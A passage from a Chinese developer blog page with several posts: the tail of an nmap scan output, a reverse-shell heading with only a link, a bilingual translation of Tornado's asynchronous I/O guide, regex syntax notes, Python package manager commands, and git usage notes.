cpe:/o:linux:linux_kernel:2.4 cpe:/o:microsoft:windows_7:::enterprise cpe:/h:bluearc:titan_2100</span><br><span class="line">Aggressive OS guesses: DD-WRT v24-sp2 (Linux 2.4.37) (99%), Microsoft Windows 7 Enterprise (95%), BlueArc Titan 2100 NAS device (91%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">TCP Sequence Prediction: Difficulty=259 (Good luck!)</span><br><span class="line">IP ID Sequence Generation: Incremental</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line">......</span><br><span class="line">NSE: Script Post-scanning.</span><br><span class="line">Read data files from: /usr/local/bin/../share/nmap</span><br><span class="line">OS and Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 895.44 seconds</span><br><span class="line">           Raw packets sent: 262711 (11.560MB) | Rcvd: 55220 (2.209MB)</span><br></pre></td></tr></table></figure>
<p>Links：<br><a target="_blank" rel="noopener" href="http://www.cyberciti.biz/networking/nmap-command-examples-tutorials/">http://www.cyberciti.biz/networking/nmap-command-examples-tutorials/</a></p>
<h4 id="反向Shell"><a href="#反向Shell" class="headerlink" title="反向Shell"></a>反向Shell</h4><p><a target="_blank" rel="noopener" href="http://os.51cto.com/art/201312/424378.htm">http://os.51cto.com/art/201312/424378.htm</a></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://noge.top/2016/08/04/1.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="nuniok">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="码力欧">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2016/08/04/1.html" class="post-title-link" itemprop="url">Asynchronous and non-Blocking I/O 翻译</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2016-08-04 00:00:00" itemprop="dateCreated datePublished" datetime="2016-08-04T00:00:00+00:00">2016-08-04</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <blockquote>
<p><a target="_blank" rel="noopener" href="http://www.tornadoweb.org/en/stable/guide/async.html">http://www.tornadoweb.org/en/stable/guide/async.html</a></p>
</blockquote>
<p>Real-time web features require a long-lived mostly-idle connection per user. In a traditional synchronous web server, this implies<br>devoting one thread to each user, which can be very expensive.<br><em>在同步状态下，实时的网络请求会一直占用着一个空的连接，这样每一个用户都会占用着一个线程，很浪费</em></p>
<p>To minimize the cost of concurrent connections, Tornado uses a single-threaded event loop. This means that all application code should aim to be asynchronous and non-blocking because only one operation can be active at a time.<br><em>为了最大限度的利用连接，Tornado使用单线程事件循环的方式。就是使应用采用异步和非阻塞的方式保持着当下只有一个活动的事件，同时又能接收多个应用请求。</em></p>
<p>The terms asynchronous and non-blocking are closely related and are often used interchangeably, but they are not quite the same thing.<br><em>异步和非阻塞这两个术语通常意思一样，但是他们也有不同的地方。</em></p>
<h2 id="Blocking"><a href="#Blocking" class="headerlink" title="Blocking"></a>Blocking</h2><p>A function blocks when it waits for something to happen before returning. A function may block for many reasons: network I&#x2F;O, disk I&#x2F;O, mutexes, etc. In fact, every function blocks, at least a little bit, while it is running and using the CPU (for an extreme example that demonstrates why CPU blocking must be taken as seriously as other kinds of blocking, consider password hashing functions like bcrypt, which by design use hundreds of milliseconds of CPU time, far more than a typical network or disk access).<br><em>等待这个功能模块返回结果前，函数有很多阻塞的原因，比如：网络I&#x2F;O、磁盘I&#x2F;O、互斥操作等。事实上每个功能模块在它运行的时候都会使用一点CPU资源（CPU阻塞必须要当做其它类型的阻塞）</em></p>
<p>A function can be blocking in some respects and non-blocking in others. For example, tornado.httpclient in the default configuration blocks on DNS resolution but not on other network access (to mitigate this use ThreadedResolver or a tornado.curl_httpclient with a properly-configured build of libcurl). In the context of Tornado we generally talk about blocking in the context of network I&#x2F;O, although all kinds of blocking are to be minimized.<br><em>函数能在一些方面阻塞，在另一些方面不阻塞，</em>*****<em>，在Tornado下我们一般讨论的是网络I&#x2F;O阻塞，其它情况都是很小的。</em><br><em>Tornado里面讨论的阻塞都是指网络阻塞，其它的阻塞可以忽略。</em></p>
<h2 id="Asynchronous"><a href="#Asynchronous" class="headerlink" title="Asynchronous"></a>Asynchronous</h2><p>An asynchronous function returns before it is finished, and generally causes some work to happen in the background before triggering some future action in the application (as opposed to normal synchronous functions, which do everything they are going to do before returning). There are many styles of asynchronous interfaces:<br><em>异步函数会在执行结束之前返回，在完成之后通常是一些后台程序去触发预先设定好的处理程序（不像同步程序，必须都做完了才返回）。下面列举了很多种风格的异步接口。</em></p>
<ul>
<li>Callback argument <em>回调参数</em></li>
<li>Return a placeholder (Future, Promise, Deferred) <em>返回一个占位符</em></li>
<li>Deliver to a queue <em>交付到队列中</em></li>
<li>Callback registry (e.g. POSIX signals) <em>回调到注册表中</em></li>
</ul>
<p>Regardless of which type of interface is used, asynchronous functions by definition interact differently with their callers; there is no free way to make a synchronous function asynchronous in a way that is transparent to its callers (systems like gevent use lightweight threads to offer performance comparable to asynchronous systems, but they do not actually make things asynchronous).<br><em>无论使用哪种接口，异步函数都会使用不同的方式与调用者交互；没有办法去定义一个同步函数却采用异步的方式调用，对于调用者来说都是透明的（就像采用gevent的轻量级线程系统去提供做到的性能堪比异步系统，但它实际上并不是异步）。</em><br><em>这句话的意思就是说同步的方法没法用异步的方式去调，虽然你写的代码看起来像是异步的，但其实并不是。</em></p>
<h2 id="Examples"><a href="#Examples" class="headerlink" title="Examples"></a>Examples</h2><p>Here is a sample synchronous function:<br><em>下面的例子是一个同步函数。</em></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from tornado.httpclient import HTTPClient</span><br><span class="line"> </span><br><span class="line">def synchronous_fetch(url):</span><br><span class="line">    http_client = HTTPClient()</span><br><span class="line">    response = http_client.fetch(url)</span><br><span class="line">    return response.body</span><br></pre></td></tr></table></figure>

<p>And here is the same function rewritten to be asynchronous with a callback argument:<br><em>下面的例子被重写成异步的方式了，采用了回调参数的方式。</em></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from tornado.httpclient import AsyncHTTPClient</span><br><span class="line"> </span><br><span class="line">def asynchronous_fetch(url, callback):</span><br><span class="line">    http_client = AsyncHTTPClient()</span><br><span class="line">    def handle_response(response):</span><br><span class="line">        callback(response.body)</span><br><span class="line">    http_client.fetch(url, callback=handle_response)</span><br></pre></td></tr></table></figure>

<p>And again with a Future instead of a callback:<br><em>下面的例子通过返回一个展位符的方式实现异步回调的。</em></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from tornado.concurrent import Future</span><br><span class="line"> </span><br><span class="line">def async_fetch_future(url):</span><br><span class="line">    http_client = AsyncHTTPClient()</span><br><span class="line">    my_future = Future()</span><br><span class="line">    fetch_future = http_client.fetch(url)</span><br><span class="line">    fetch_future.add_done_callback(</span><br><span class="line">        lambda f: my_future.set_result(f.result()))</span><br><span class="line">    return my_future</span><br></pre></td></tr></table></figure>

<p>The raw Future version is more complex, but Futures are nonetheless recommended practice in Tornado because they have two major advantages. Error handling is more consistent since the Future.result method can simply raise an exception (as opposed to the ad-hoc error handling common in callback-oriented interfaces), and Futures lend themselves well to use with coroutines. Coroutines will be discussed in depth in the next section of this guide. Here is the coroutine version of our sample function, which is very similar to the original synchronous version:<br><em>通过<code>Future</code>的方式实现的更复杂，但是Tornado更建议这样去写，主要有两个原因。从<code>Future</code>返回的错误处理更一致，从<code>Future.result</code>方法可以返回一个简单的异常，<code>Future</code>能够更好的与协同程序一起使用。协同程序的具体讨论将会在下一节讨论，下面的例子给了一个协同程序的例子，写法很像同步的那个版本。</em></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from tornado import gen</span><br><span class="line"> </span><br><span class="line">@gen.coroutine</span><br><span class="line">def fetch_coroutine(url):</span><br><span class="line">    http_client = AsyncHTTPClient()</span><br><span class="line">    response = yield http_client.fetch(url)</span><br><span class="line">    raise gen.Return(response.body)</span><br></pre></td></tr></table></figure>

<p>The statement raise gen.Return(response.body) is an artifact of Python 2, in which generators aren’t allowed to return values. To overcome this, Tornado coroutines raise a special kind of exception called a Return. The coroutine catches this exception and treats it like a returned value. In Python 3.3 and later, a return response.body achieves the same result.<br><em>这个版本中返回一个<code>raise gen.Return(response.body)</code>，在Python2中的用法，因为生成器不允许返回一个值，所以Tornado做了特殊处理，通过跑出一个<code>Return</code>的异常，然后协同程序补货这个异常，就相当于返回值了。在Python3.3以后就可以直接返回这个值了。</em></p>
<blockquote>
<p>Translated by zhangxu on 2016-08-05</p>
</blockquote>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://noge.top/2016/01/09/1.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="nuniok">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="码力欧">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2016/01/09/1.html" class="post-title-link" itemprop="url">正则表达式</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2016-01-09 00:00:00" itemprop="dateCreated datePublished" datetime="2016-01-09T00:00:00+00:00">2016-01-09</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h2 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h2><p>用来匹配和处理文本的字符串。基本用途是查找和替换。一种不完备的程序设计语言。</p>
<hr>
<h2 id="含义列表"><a href="#含义列表" class="headerlink" title="含义列表"></a>含义列表</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">.  # 英文句号，匹配任意单个字符包括自身，相当于DOS中的 ? ，SQL中的 _ 。</span><br><span class="line">\  # 反斜杠，元字符，转义用。转义自身用 \\ 。</span><br><span class="line">[]  # 中括号，元字符，定义一个字符集合。</span><br><span class="line">-  # 连字符，字符区间用，比如0-9、A-Z。只能用在字符集合中。</span><br><span class="line">^  # 取非匹配，字符区间用。</span><br><span class="line">\d  # 任何一个数字字符。</span><br><span class="line">\D  # 任何一个非数字字符。</span><br><span class="line">\w  # 任何一个字母数字字符或下划线字符（[a-zA-Z0-9_]）</span><br><span class="line">\W  # 任何一个非字母数字或非下划线字符（[^a-zA-Z0-9_]）</span><br><span class="line">\s  # 任何一个空白字符（[\f\n\r\t\v]）</span><br><span class="line">\S # 任何一个非空白字符（[^\f\n\r\t\v]）</span><br><span class="line">+  # 匹配一个或多个字符，放在字符或字符集合后面。</span><br><span class="line">*  # 匹配零个或多个字符，放在字符或字符集合后面。</span><br><span class="line">?  # 匹配零个或一个字符，放在字符或字符集合后面。</span><br><span class="line">&#123;&#125;  # 指定匹配个数的区间或精确值。&#123;6&#125;、&#123;2,4&#125;。</span><br><span class="line"></span><br><span class="line">()  # 子表达式</span><br><span class="line">|  # 或操作符</span><br></pre></td></tr></table></figure>

<h3 id="懒惰型匹配，匹配最小子集。"><a href="#懒惰型匹配，匹配最小子集。" class="headerlink" title="懒惰型匹配，匹配最小子集。"></a>懒惰型匹配，匹配最小子集。</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">+?</span><br><span class="line">*?</span><br><span class="line">&#123;n,&#125;?</span><br></pre></td></tr></table></figure>

<h3 id="位置匹配"><a href="#位置匹配" class="headerlink" title="位置匹配"></a>位置匹配</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">\b  # 单词边界</span><br><span class="line">\B  # 不是单词边界</span><br><span class="line">^  # 字符串边界开始</span><br><span class="line">$  # 字符串边界结束</span><br><span class="line">(?m)  # 分行匹配模式， 使表达式引擎将分隔符当做一个字符串分隔符对待。</span><br></pre></td></tr></table></figure>

<h3 id="回溯引用"><a href="#回溯引用" class="headerlink" title="回溯引用"></a>回溯引用</h3><p>下面例子匹配 <code>空格 字符 空格</code><br><img src="/resource/img/zzbds/0b845d60-f9f5-4240-8f55-24f8cea04953.png" alt="原始图片"><br>下面的例子使回溯引用<br><img src="/resource/img/zzbds/a8a95f79-96ed-45db-8cb3-790a7ac6b64d.png" alt="原始图片"><br>解释回溯引用，<code>\1</code>用来获取<code>(\w+)</code>中的字符串。第一个匹配上的<code>of</code>被<code>\1</code>引用，就变成表达式<code>[ ]+(\w+)[ ]+of</code>。<br>其中<code>\1</code>代表模式里的第一个子表达式，<code>\2</code>就会代表着第二个子表达式，以此递推。</p>
<h3 id="替换"><a href="#替换" class="headerlink" title="替换"></a>替换</h3><p><img src="/resource/img/zzbds/32cebbb3-461b-4259-b8a3-b83d0280b752.png" alt="原始图片"></p>
<blockquote>
<p>大小写转换测试工具不支持，待测试</p>
</blockquote>
<h3 id="向前查找、向后查找"><a href="#向前查找、向后查找" class="headerlink" title="向前查找、向后查找"></a>向前查找、向后查找</h3><p>必须要放到一个字表达式中，如下例子，根据<code>:</code>来匹配，但是不消费他。<br><code>(?=)</code> 向前查找</p>
<p><img src="/resource/img/zzbds/0b28d288-452d-4d9a-a416-0e98f80d8278.png" alt="原始图片"></p>
<p><code>(?&lt;=)</code> 向后查找<br><img src="/resource/img/zzbds/acbe623c-05c5-444f-b385-169b6adedadb.png" alt="原始图片"></p>
<p><code>(?!)</code> 负向前查找<br><code>(?&lt;!)</code> 负向后查找</p>
<h3 id="嵌入条件"><a href="#嵌入条件" class="headerlink" title="嵌入条件"></a>嵌入条件</h3><p><code>(?(brackreference)true-regex)</code>其中<code>?</code>表明这是一个条件，括号里的<code>brackreference</code>是一个回溯引用，<code>true-regex</code>是一个只在<code>backreference</code>存在时才会被执行的子表达式。<br><img src="/resource/img/zzbds/352f8f35-dcac-4440-a21f-4779a26ac743.png" alt="原始图片"></p>
<hr>
<h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><h3 id="不区分大小写匹配"><a href="#不区分大小写匹配" class="headerlink" title="不区分大小写匹配"></a>不区分大小写匹配</h3><p><img src="/resource/img/zzbds/00434677-3908-47ed-b192-1b337f8ea064.png" alt="原始图片"></p>
<h3 id="字符区间匹配"><a href="#字符区间匹配" class="headerlink" title="字符区间匹配"></a>字符区间匹配</h3><p><img src="/resource/img/zzbds/c44e81f9-acf5-4bb6-8f9a-e062724871bd.png" alt="原始图片"></p>
<h3 id="取非匹配"><a href="#取非匹配" class="headerlink" title="取非匹配"></a>取非匹配</h3><p><img src="/resource/img/zzbds/686133cb-f93b-4954-a17a-5aed01c0e0e8.png" alt="原始图片"></p>
<h3 id="匹配多个字符"><a href="#匹配多个字符" class="headerlink" title="匹配多个字符"></a>匹配多个字符</h3><p><img src="/resource/img/zzbds/3c36ee0a-819a-40ca-9dd5-150e0cb68beb.png" alt="原始图片"></p>
<h3 id="子表达式"><a href="#子表达式" class="headerlink" title="子表达式"></a>子表达式</h3><p><img src="/resource/img/zzbds/d5cb48c9-e648-4874-b24a-d950ffbd9868.png" alt="原始图片"></p>
<h3 id="匹配四位数的年份"><a href="#匹配四位数的年份" class="headerlink" title="匹配四位数的年份"></a>匹配四位数的年份</h3><p><img src="/resource/img/zzbds/64ddb1d1-bb13-476b-9fc4-ae4dc93e1c08.png" alt="原始图片"></p>
<h3 id="嵌入查找、向后查找组合应用"><a href="#嵌入查找、向后查找组合应用" class="headerlink" title="嵌入查找、向后查找组合应用"></a>嵌入查找、向后查找组合应用</h3><p><img src="/resource/img/zzbds/9bb21719-d586-4f77-98f7-8b0c37f16a0a.png" alt="原始图片"></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://noge.top/2015/09/19/1.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="nuniok">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="码力欧">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2015/09/19/1.html" class="post-title-link" itemprop="url">Python 包管理</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2015-09-19 00:00:00" itemprop="dateCreated datePublished" datetime="2015-09-19T00:00:00+00:00">2015-09-19</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h2 id="pip"><a href="#pip" class="headerlink" title="pip"></a>pip</h2><p>pip更新<code>python -m pip install -U pip</code></p>
<h3 id="pipy国内镜像目前有："><a href="#pipy国内镜像目前有：" class="headerlink" title="pipy国内镜像目前有："></a>pipy国内镜像目前有：</h3><p><a target="_blank" rel="noopener" href="https://pypi.douban.com/">https://pypi.douban.com/</a>  豆瓣</p>
<p><a target="_blank" rel="noopener" href="https://mirrors.tuna.tsinghua.edu.cn/pypi/web/">https://mirrors.tuna.tsinghua.edu.cn/pypi/web/</a> 清华大学</p>
<h3 id="指定源安装"><a href="#指定源安装" class="headerlink" title="指定源安装"></a>指定源安装</h3><p>pip可以通过指定源的方式安装 <code>pip install web.py -i https://pypi.douban.com/simple</code></p>
<p>也可以通过修改配置文件，Linux的文件在<code>~/.pip/pip.conf</code>，Windows在<code>%HOMEPATH%\pip\pip.ini</code>。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[global]</span><br><span class="line">index-url = https://pypi.douban.com/simple</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="easy-install"><a href="#easy-install" class="headerlink" title="easy_install"></a>easy_install</h2><p>easy_install指定源安装 <code>easy_install -i https://pypi.douban.com/simple</code></p>
<p>或者修改配置文件 <code>~/.pydistutils.cfg</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[easy_install]</span><br><span class="line">index_url = http://e.pypi.python.org/simple</span><br></pre></td></tr></table></figure>

<p>easy_install查看包的版本</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@xyz-pc:~# easy_install tornado -v</span><br><span class="line">Searching for tornado</span><br><span class="line">Best match: tornado 4.0.2</span><br><span class="line">tornado 4.0.2 is already the active version in easy-install.pth</span><br><span class="line"></span><br><span class="line">Using /usr/lib/python2.7/dist-packages</span><br><span class="line">Processing dependencies for tornado</span><br><span class="line">Finished processing dependencies for tornado</span><br><span class="line">Searching for -v</span><br><span class="line">Reading https://pypi.python.org/simple/-v/</span><br><span class="line">Couldn&#x27;t find index page for &#x27;-v&#x27; (maybe misspelled?)</span><br><span class="line">Scanning index of all packages (this may take a while)</span><br><span class="line">Reading https://pypi.python.org/simple/</span><br><span class="line">No local packages or download links found for -v</span><br><span class="line">error: Could not find suitable distribution for Requirement.parse(&#x27;-v&#x27;)</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="安装Python安装包管理工具相关命令"><a href="#安装Python安装包管理工具相关命令" class="headerlink" title="安装Python安装包管理工具相关命令"></a>安装Python安装包管理工具相关命令</h2><p>安装easy_install：<code>apt-get install python-setuptools</code></p>
<p><code>sudo yum install python-setuptools-devel</code></p>
<p><code>esay_install pip</code></p>
<p>pip指定版本：<code>pip install &#39;pymongo&lt;2.8&#39;</code></p>
<p>升级版本：<code>pip install --upgrade pymongo</code></p>
<p>查看已安装包：<code>pip show --files SomePackage</code></p>
<p>查看需要更新的包：<code>pip list --outdated</code></p>
<p>卸载包：<code>pip uninstall SomePackage</code></p>
<p>帮助：<code>pip --help</code></p>
<p>指定豆瓣源安装：<code>pip install -i https://pypi.douban.com/simple/ functools32</code></p>
<p>查看已安装包：<code>pip list</code></p>
<blockquote>
<p><a target="_blank" rel="noopener" href="http://www.cnblogs.com/taosim/articles/3288821.html">http://www.cnblogs.com/taosim/articles/3288821.html</a></p>
</blockquote>
<h2 id="pipenv"><a href="#pipenv" class="headerlink" title="pipenv"></a>pipenv</h2><p>安装 <code>pip3 install pipenv</code></p>
<p>安装虚拟环境 <code>pipenv install</code></p>
<p>启动虚拟环境 <code>pipenv shell</code></p>
<p>查看当前环境依赖 <code>pip3 list</code></p>
<p>退出虚拟环境 <code>exit</code></p>
<p>安装 <code>pipenv install ……</code></p>
<p>卸载 <code>pipenv uninstall ……</code></p>
<p>查看依赖关系 <code>pipenv graph</code></p>
<p>查看虚拟环境路径 <code>pipenv --venv</code></p>
<p>删除环境 <code>pipenv --rm</code></p>
<p>创建 Python3 环境 <code>pipenv --three</code></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://noge.top/2015/08/14/1.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="nuniok">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="码力欧">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2015/08/14/1.html" class="post-title-link" itemprop="url">Git使用一年总结</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2015-08-14 00:00:00" itemprop="dateCreated datePublished" datetime="2015-08-14T00:00:00+00:00">2015-08-14</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h5 id="git-fetch-merge"><a href="#git-fetch-merge" class="headerlink" title="git fetch merge"></a>git fetch merge</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git remote -vv</span><br><span class="line">git remote add base git@git.in.xxx.com:sss/xxx.git</span><br><span class="line">git fetch base</span><br><span class="line">git merge base/master</span><br></pre></td></tr></table></figure>

<h5 id="git切换远程仓库地址"><a href="#git切换远程仓库地址" class="headerlink" title="git切换远程仓库地址"></a>git切换远程仓库地址</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git remote set-url origin [url]</span><br></pre></td></tr></table></figure>

<h5 id="使用git在本地创建一个项目的过程"><a href="#使用git在本地创建一个项目的过程" class="headerlink" title="使用git在本地创建一个项目的过程"></a>使用git在本地创建一个项目的过程</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ makdir ~/hello-world    //创建一个项目hello-world</span><br><span class="line">$ cd ~/hello-world       //打开这个项目</span><br><span class="line">$ git init             //初始化</span><br><span class="line">$ touch README</span><br><span class="line">$ git add README        //更新README文件</span><br><span class="line">$ git commit -m &#x27;first commit&#x27;     //提交更新，并注释信息“first commit”</span><br><span class="line">$ git remote add origin git@github.test/hellotest.git     //连接远程github项目</span><br><span class="line">$ git push -u origin master     //将本地项目更新到github项目上去</span><br></pre></td></tr></table></figure>

<hr>
<h5 id="git设置关闭自动换行"><a href="#git设置关闭自动换行" class="headerlink" title="git设置关闭自动换行"></a>git设置关闭自动换行</h5><p><code>git config --global core.autocrlf false</code><br>为了保证文件的换行符是以安全的方法，避免windows与unix的换行符混用的情况，最好也加上这么一句<br><code>git config --global core.safecrlf true</code></p>
<hr>
<h5 id="git-tag-使用"><a href="#git-tag-使用" class="headerlink" title="git tag 使用"></a>git tag 使用</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">git tag  # 列出当前仓库的所有标签</span><br><span class="line">git tag -l &#x27;v0.1.*&#x27;  # 搜索符合当前模式的标签</span><br><span class="line"></span><br><span class="line">git tag v0.2.1-light  # 创建轻量标签</span><br><span class="line">git tag -a v0.2.1 -m &#x27;0.2.1版本&#x27;  # 创建附注标签</span><br><span class="line"></span><br><span class="line">git checkout [tagname]  # 切换到标签</span><br><span class="line">git show v0.2.1  # 查看标签版本信息</span><br><span class="line"></span><br><span class="line">git tag -d v0.2.1  # 删除标签</span><br><span class="line">git tag -a v0.2.1 9fbc3d0  # 补打标签</span><br><span class="line"></span><br><span class="line">git push origin v0.1.2  # 将v0.1.2标签提交到git服务器</span><br><span class="line">git push origin –tags  # 将本地所有标签一次性提交到git服务器</span><br><span class="line">git tag  # 查看当前分支下的标签</span><br></pre></td></tr></table></figure>


<hr>
<h5 id="git-pull问题"><a href="#git-pull问题" class="headerlink" title="git pull问题"></a>git pull问题</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">You asked me to pull without telling me which branch you</span><br><span class="line">want to merge with, and &#x27;branch.content_api_zhangxu.merge&#x27; in</span><br><span class="line">your configuration file does not tell me, either. Please</span><br><span class="line">specify which branch you want to use on the command line and</span><br><span class="line">try again (e.g. &#x27;git pull &lt;repository&gt; &lt;refspec&gt;&#x27;).</span><br><span class="line">See git-pull(1) for details.</span><br><span class="line"></span><br><span class="line">If you often merge with the same branch, you may want to</span><br><span class="line">use something like the following in your configuration file:</span><br><span class="line"></span><br><span class="line">    [branch &quot;content_api_zhangxu&quot;]</span><br><span class="line">    remote = &lt;nickname&gt;</span><br><span class="line">    merge = &lt;remote-ref&gt;</span><br><span class="line"></span><br><span class="line">    [remote &quot;&lt;nickname&gt;&quot;]</span><br><span class="line">    url = &lt;url&gt;</span><br><span class="line">    fetch = &lt;refspec&gt;</span><br><span 